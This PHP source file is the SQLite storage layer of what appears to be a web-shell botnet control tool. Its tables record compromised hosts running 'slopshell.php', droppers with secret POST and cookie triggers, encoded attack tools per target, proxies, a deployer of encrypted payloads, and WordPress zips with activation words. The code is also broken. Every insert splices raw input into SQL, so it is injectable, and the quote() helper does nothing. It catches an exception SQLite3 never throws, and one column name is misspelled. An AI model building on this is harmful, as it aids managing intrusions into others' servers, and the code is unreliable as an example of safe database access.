<?php

namespace database;

use PDOException;

class slopSqlite extends \SQLite3
{
    public function __construct(string $filename, int $flags = SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE)
    {
        parent::__construct($filename, $flags);
    }
    public static function escapeString(string $string): string
    {
        return parent::escapeString($string); // TODO: Change the autogenerated stub
    }

    public function busyTimeout(int $milliseconds): bool
    {
        return parent::busyTimeout($milliseconds); // TODO: Change the autogenerated stub
    }

    public function close(): void
    {
        parent::close(); // TODO: Change the autogenerated stub
    }

    public function firstRun(): array
    {
        $success_list = [];
        $current_host = $_SERVER['HTTP_HOST'] ?? "localhost";
        $prepare_tables = [
            "main" => "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, datetime TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL DEFAULT '/slopshell.php', uuid TEXT UNIQUE NOT NULL, os_flavor TEXT NOT NULL, check_in INTEGER DEFAULT 0 NOT NULL);",
            "droppers" => "CREATE TABLE IF NOT EXISTS sloppy_bots_slim_droppers(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,location_on_disk TEXT UNIQUE NOT NULL,post_var TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT 'sp/1.1');",
            "domains" => "CREATE TABLE IF NOT EXISTS sloppy_bots_domains(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,uses INTEGER NOT NULL DEFAULT 0,from_domain TEXT NOT NULL DEFAULT '{$current_host}');",
            "tools" => "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,tool_name TEXT UNIQUE NOT NULL,target TEXT NOT NULL,base64_encoded_tool TEXT UNIQUE NOT NULL,keys TEXT UNIQUE,tags TEXT UNIQUE,iv TEXT UNIQUE,cipher TEXT NOT NULL DEFAULT 'NONE',hmac_hash TEXT UNIQUE,lang TEXT NOT NULL,is_encrypted BOOLEAN DEFAULT false);",
            "certs" => "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,cert_location_on_disk TEXT UNIQUE NOT NULL,base64_encoded_cert TEXT UNIQUE NOT NULL,csr TEXT UNIQUE,pub TEXT UNIQUE,pem TEXT UNIQUE,cipher TEXT DEFAULT '-',is_encrypted BOOLEAN DEFAULT FALSE,priv_key_pass TEXT UNIQUE NOT NULL,rotated BOOLEAN NOT NULL DEFAULT FALSE);",
            "proxies" => "CREATE TABLE IF NOT EXISTS sloppy_bots_proxies(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,proxy_schema TEXT NOT NULL DEFAULT '-',proxy TEXT UNIQUE NOT NULL,times_used INTEGER NOT NULL DEFAULT 0,last_domain_contacted TEXT NOT NULL DEFAULT '-',proxy_still_viable BOOLEAN NOT NULL DEFAULT TRUE,round_trip_time INTEGER NOT NULL DEFAULT 0,time_outs INTEGER NOT NULL DEFAULT 0,successful_responses INTEGER NOT NULL DEFAULT 0);",
            "deployer" => "CREATE TABLE IF NOT EXISTS sloppy_deployer(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,encrypted_contents TEXT NOT NULL,pem_used TEXT NOT NULL DEFAULT 'NONE',targeted_host TEXT NOT NULL);",
            "wordpress" => "CREATE TABLE IF NOT EXISTS sloppy_wordpress(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, zip_file TEXT NOT NULL, activation_word TEXT UNIQUE NOT NULL)"
        ];
        foreach ($prepare_tables as $table => $createCall) {
            if ($this->exec($createCall) === true) {
                $success_list[$table] = "Successful!\n";
            } else {
                $success_list[$table] = "Not successful.\n";
            }
        }
        return $success_list;
    }
    public function insertData(array $data): bool{
        switch ($data["action"]){
            case str_contains($data['action'], "add_press") !== false:
                $this->exec(sprintf("INSERT INTO sloppy_wordpress(zip_file, activation_word) VALUES ('%s', '%s');", $data['zip'], $data['activator']));
                return true;
            case str_contains($data['action'], "add_bot"):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_main(rhost, uri, uuidd, os_flavor, check_in) VALUES ('%s', '%s', '%s', '%s', '%s');",
                        $data['rhost'],
                        $this->quote($data['uri']),
                        $this->quote($data['uuid']),
                        $this->quote($data['os_flavor']),
                        $this->quote($data['check_in']) ?? 1
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert main table Error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], "add_dropper"):
                try {
                    $this->exec(sprintf("INSERT INTO sloppy_bots_slim_droppers(location_on_disk, post_var, cookiename, user_agent) VALUES('%s', '%s', '%s', '%s');",
                        $data['location_on_disk'],
                        $data['post_var'],
                        $data['cookiename'],
                        $data['user_agent']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert dropper Error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], 'add_cert'):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s');",
                        $data['cert_location'],
                        $data['base64_data'],
                        $data['csr'],
                        $data['pub'],
                        $data['pem'],
                        $data['cipher'],
                        $data['is_encrypted'],
                        $data['priv_key_pass']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert certificate error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], "proxies"):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES('%s', '%s');",
                        $data['proxy_schema'],
                        $data['proxy']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert proxy error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], "add_tool_encrypted"):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, is_encrypted) VALUES('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s');",
                        $data['tool_name'],
                        $data['target'],
                        $data['base64_data'],
                        $data['key'],
                        $data['tag'],
                        $data['iv'],
                        $data['cipher'],
                        $data['hmac_hash'],
                        $data['lang'],
                        $data['is_encrypted']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert encrypted tool error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], "add_tool"):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES('%s','%s','%s','%s', '%s');",
                        $data['tool_name'],
                        $data['target'],
                        $data['base64_data'],
                        $data['lang'],
                        $data['is_encrypted']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert tool error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            case str_contains($data['action'], "add_domain"):
                try{
                    $this->exec(sprintf("INSERT INTO sloppy_bots_domains(from_domain) VALUES('%s');",
                        $data['domain_name']
                    ));
                    return true;
                }catch (PDOException $e){
                    print("Insert domain error: " . $this->lastErrorMsg() . PHP_EOL);
                    return false;
                }
            default:
                print("Action was empty, cannot handle this.");
                return false;
        }
    }

    private function quote(mixed $uri)
    {
        str_replace($uri, "\'", "'");
        str_replace($uri, "\\\"", "\"");
        str_replace($uri, "", ";");
        return $uri;
    }
}